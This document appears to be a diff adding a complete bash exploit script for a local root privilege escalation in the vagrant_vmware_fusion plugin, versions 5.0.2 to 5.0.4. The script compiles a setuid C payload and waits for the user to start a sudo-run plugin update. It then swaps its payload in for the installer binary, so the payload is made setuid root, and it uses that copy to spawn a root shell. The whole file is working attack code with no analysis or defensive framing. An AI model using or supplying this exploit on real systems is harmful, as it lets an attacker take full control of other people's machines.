@@ -1,0 +1,67 @@
+#!/bin/bash
+echo "##############################################"
+echo "vagrant_vmware_fusion 5.0.2-5.0.4 root privesc"
+echo "by m4rkw"
+echo "##############################################"
+echo
+
+ruby_version=`ls ~/.vagrant.d/gems/ |xargs`
+plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d '-' -f4`
+
+echo "compiling..."
+
+cat > vvf.c <<EOF
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+int main(int ac, char *av[])
+{
+  setuid(0);
+  seteuid(0);
+  if (ac > 1) {
+    system("mv -f $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 /tmp/vvf_exp");
+    system("chown root:wheel /tmp/vvf_exp");
+    system("chmod 4755 /tmp/vvf_exp");
+    system("mv -f $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64.orig $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64");
+    system("$HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 install\012");
+    return 0;
+  }
+  system("rm -f /tmp/vvf_exp");
+  execl("/bin/bash","bash",NULL);
+  return 0;
+}
+EOF
+
+gcc -o /tmp/vvf_exp vvf.c
+rm -f vvf.c
+
+echo "waiting for user to initiate vagrant plugin update..."
+
+while :
+do
+  r=`ps auxwww |grep '/usr/bin/sudo' |grep 'vagrant-vmware-installer_darwin_amd64 install' |grep -v grep`
+  if [ "$r" != "" ] ; then
+    break
+  fi
+done
+
+pid=`ps auxww |grep './vagrant-vmware-installer_darwin_amd64 install' |grep -v grep |xargs -L1 |cut -d ' ' -f2`
+
+cd $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop
+
+echo "dropping payload in place of installer binary..."
+
+mv -f vagrant-vmware-installer_darwin_amd64 vagrant-vmware-installer_darwin_amd64.orig
+mv -f /tmp/vvf_exp vagrant-vmware-installer_darwin_amd64
+
+echo "waiting for payload to trigger..."
+
+while :
+do
+  r=`ls -la /tmp/vvf_exp 2>/dev/null |grep -- '-rwsr-xr-x' |grep root`
+  if [ "$r" != "" ] ; then
+    echo "spawning shell..."
+    /tmp/vvf_exp
+    exit 0
+  fi
+done
